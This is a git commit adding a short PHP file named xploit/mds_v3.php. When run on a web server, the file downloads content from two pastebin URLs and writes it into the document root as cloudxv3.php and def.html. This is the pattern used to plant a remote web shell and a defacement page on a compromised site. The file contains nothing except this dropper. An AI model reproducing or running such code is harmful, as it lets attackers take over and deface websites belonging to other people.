0622e0fbd17af76948b6ae7a0a31ea7eab4731d9
greenhacking02 <snowdenbill02@gmail.com>
2018-04-12 21:58:48 +0800

    wew

---
+++ xploit/mds_v3.php
@@ -0,0 +1,30 @@
+V3rluchie
+<?php
+function http_get($url){
+	$im = curl_init($url);
+	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($im, CURLOPT_HEADER, 0);
+	return curl_exec($im);
+	curl_close($im);
+}
+$check = $_SERVER['DOCUMENT_ROOT'] . "/cloudxv3.php" ;
+$text = http_get('https://pastebin.com/raw/6b8KR1uC');
+$open = fopen($check, 'w');
+fwrite($open, $text);
+fclose($open);
+if(file_exists($check)){
+    echo $check."</br>";
+}else 
+  echo "not exits";
+echo "done .\n " ;
+
+$check3=$_SERVER['DOCUMENT_ROOT'] . "/def.html" ;
+$text3 = http_get('https://pastebin.com/raw/tusdKW82');
+$op3=fopen($check3, 'w');
+fwrite($op3,$text3);
+fclose($op3);
+
+
+?>
